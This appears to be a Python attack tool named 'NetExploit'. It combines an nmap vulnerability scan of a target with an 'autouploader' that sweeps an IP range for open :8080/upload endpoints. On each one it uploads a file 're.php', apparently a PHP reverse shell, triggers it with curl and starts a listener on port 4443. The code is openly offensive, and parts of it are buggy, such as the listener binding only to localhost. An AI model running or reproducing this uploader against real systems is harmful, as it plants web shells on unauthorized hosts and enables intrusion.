#!/usr/bin/python3
import os
import sys
import time
from typing import Collection
import requests
import nmap
import json
import urllib3
import urllib

import base64
import pandas as pd
import hashlib
import socket
from art import *
from termcolor import colored
sys.path.append('__init__')
import file_creator as file
import get_ip as ad
SEC_PATH = "/usr/bin/"
nm = nmap.PortScanner()

def listen(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 4443))
    s.listen(4443)
    while True:
        conn, addr = s.accept()
        print("[+] Connection from: %s" % str(addr))
        data = conn.recv(1024)
        print("[+] Received: %s" % data)
        conn.send(data)
        conn.close()

def download_file(url, filename):
    # NOTE the stream=True parameter
    r = requests.get(url, stream=True)
    with open(filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush()
    return filename

def get_file_size(filename):
    return os.stat(filename).st_size

def get_file_md5(filename):
    import hashlib
    hash_md5 = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()


def upload_file(url, filename):
    files = {'file': open(filename, 'rb')}
    r = requests.post(url, files=files)
    return r.text

def get_file_list(url):
    r = requests.get(url)
    return r.text

def banner():
    print(colored(text2art("NetExploit"), "red"))
    print(colored("[+] Author: Guidenevada", "green"))


def scan_network(ip_range):
    ip_list = []
    for i in range(1, 255):
        ip = ip_range + str(i)
        try:
            socket.inet_aton(ip)
            ip_list.append(ip)
        except socket.error:
            pass
    return ip_list

def uploader():
    
    urllib3.disable_warnings()
    
    target_ip_range = input(colored("[+] Enter target IP range: ", "blue"))
    
    ip_list = scan_network(target_ip_range)
    fast = 0.5
    slow = 3
    speed = input("[*] The slow scan can take 13 minutes and the fast one can take 3 minutes\n[+] Speed (fast/slow): ")
    if speed == "fast":
        timeo = fast
    elif speed == "slow":
        timeo = slow
    else:
        print("[-] Invalid speed")
        main()
    for ip in ip_list:
        try:
            url = "http://" + ip + ":8080/upload"

                
            print(colored("[*] Testing %s" % url, "blue"))
            r = requests.get(url, timeout=timeo)
            if r.status_code == 200:
                path_dir ="report/" + ip
                file.create_dir(path_dir)
                print(colored("[+] %s is vulnerable" % url, "green"))
                filename = "re.php"
                print(colored("[+] File size: %s" % get_file_size(filename), "green"))
                print(colored("[+] File md5: %s" % get_file_md5(filename), "green"))
                upload_file(url, filename)
                print(colored("[+] File %s uploaded" % filename, "green"))
                port = 4443
                print(colored("[+] Listening on port %s" % port, "green"))
                os.system("gnome-terminal --bash -c 'curl "+ url+"/re.php'")
                listener = input(colored("[*] Do you want to start a listener? (in test) [y/n]: ", "blue"))
                if (listener == "y") or (listener == "Y"):
                    listen(port)
                else:
                    pass
                
        except Exception as e:
            print(e)
        
        except KeyboardInterrupt:
            print(colored("[-] User Interrupt", "red"))
            exit(1)
        except:
            print(("[-] Unknown error", 'red'))


def scanner():
    url = input(colored("[+] Enter target URL: ", "blue"))
    ip = ad.get(url)
    path_dir =str("report/" + ip)

    if ip == "error":
        print(colored("[-] Invalid URL or host DOWN", "red"))
        main()
    file.create_dir(path_dir)

    print(colored("[+] Target IP: %s" % ip, "green"))
    print(colored("[+] Target URL: %s" % url, "green"))
    print(colored("[*] Testing %s" % url, "blue"))
    result = nm.scan(hosts=str(ip), arguments='-sV  -Pn  -sC  -T4  --script=vuln')
    
    xml = nm.get_nmap_last_output()
    resultcsv = nm.csv()
    #printable = nm.scan('nmap -sV -oX ' + path_dir + '/nmap.xml  --script vuln,safe  ' + ip)
    resultb64 = base64.b64encode(str(result).encode('utf-8'))
    resultb64 = str(resultb64)
    resultb64 = resultb64.replace('b\'', '')
    resultb64 = resultb64.replace("'", '')
    print(colored("[+] Scan completed", "green"))
    clear = json.dumps(result)
    #print(resultb64)
    resjson = str(path_dir + "/nmap.json")
    rescsv = str(path_dir + "/nmap.csv")
    resxml = str(path_dir + "/nmap.xml")
    #open(resjson, 'w').write(result)

    print(colored("[+] scan results :\n " + ip + "\n" ,"green"))
    print(nm[ip].hostname())
    print(nm[ip].all_protocols())
    print(nm[ip].all_tcp())
     
    
    
    
    
    open(rescsv , 'w').write(resultcsv)
    open(resxml , 'w').write(xml)
    print(colored("[+] Nmap scan saved in %s" % path_dir, "green"))
    #print(open(path_dir + '/nmap.csv').read())
    exit()   


def main():
    #print(colored("[+] NetExploit", "red"))
    #print(colored("[+] Author: Guidenevada", "green"))
    choice = int(input(colored("\n1 -webscan\n2 -autouploader\n\n[+] Choose an option: ", "blue")))
    if choice == 1:
        
        scanner()
    if choice == 2:
        uploader()
    else:
        print(colored("[-] Invalid option", "red"))
        main()
if __name__ == "__main__":
    banner()
    main()
